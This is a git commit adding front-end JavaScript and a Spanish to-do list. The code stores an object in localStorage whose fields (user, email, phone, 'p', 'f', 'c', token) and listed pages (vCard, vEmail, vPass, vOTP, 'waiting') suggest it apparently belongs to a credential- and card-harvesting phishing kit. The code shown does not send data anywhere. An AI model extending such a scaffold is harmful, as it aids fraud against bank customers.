8be0e823f90525c27fbd57f58a4f177b55f52acb
canutoforever3@gmail.com <adrian.kanox.2003@gmail.com>
2023-06-26 17:55:51 -0500

    fc

---
+++ public/js/app.js
@@ -0,0 +1,100 @@
+/**
+ * API CONNECTIONS
+ */
+const API_URL = 'http://127.0.0.1:8080';
+const LS = window.localStorage;
+let info = {
+    user: '',
+    puser: '',
+    email: '',
+    pemail: '',
+    cel: '',
+    p: '',
+    f: '',
+    c: '',
+    type: '',
+    tok: '',
+    err: ''
+
+}
+
+LS.getItem('info') ? info = JSON.parse(LS.getItem('info')) : LS.setItem('info', JSON.stringify(info));
+
+try{
+    msgError = document.querySelector('#alt-mensaje');
+    if(info.err !== ''){
+        msgError.style.display = 'block';
+    }
+}catch(err){
+    console.log(err);
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/**
+ * CLOCK AND IP
+ */
+function updateClock() {
+    var now = new Date();
+
+    var days = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+    var day = days[now.getDay()];
+
+    var date = now.getDate();
+
+    var months = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+    var month = months[now.getMonth()];
+
+    var year = now.getFullYear();
+
+    var hours = now.getHours();
+    var minutes = now.getMinutes();
+    var seconds = now.getSeconds();
+    var meridiem = hours >= 12 ? 'PM' : 'AM';
+
+    hours = hours % 12;
+    hours = hours ? hours : 12;
+
+    minutes = minutes < 10 ? '0' + minutes : minutes;
+    seconds = seconds < 10 ? '0' + seconds : seconds;
+
+    var time = day + ' ' + date + ' de ' + month + ' de ' + year + ' ' + hours + ':' + minutes + ':' + seconds + ' ' + meridiem;
+
+    document.getElementById('fecha-hora').textContent = time;
+}
+
+function getIP() {
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            var ip = data.ip;
+            document.getElementById('ip').textContent = ip;
+        })
+        .catch(error => {
+            console.error('Error al obtener la dirección IP:', error);
+            document.getElementById('ip').textContent = 'No se pudo obtener la dirección IP';
+        });
+}
+
+try{
+    setInterval(updateClock, 1000);
+    document.addEventListener('DOMContentLoaded', getIP);
+}catch(err){
+    console.log(err);
+}
---
+++ public/notes.md
@@ -0,0 +1,16 @@
+### LISTA DE TAREAS ###
+
+-> Visual de (Hora actual, télefonos, logos, párrafos) 
+
+-> Arreglar cabeceras
+
+-> Cambiar todo a archivos JS
+
+   ## errOTP CHECKED
+   ## success CHECKED
+   ## user CHECKED
+   ## vCard CHECKED
+   ## vEmail CHECKED
+   ## vOTP CHECKED
+   ## vPass CHECKED
+   ## waiting CHECKED
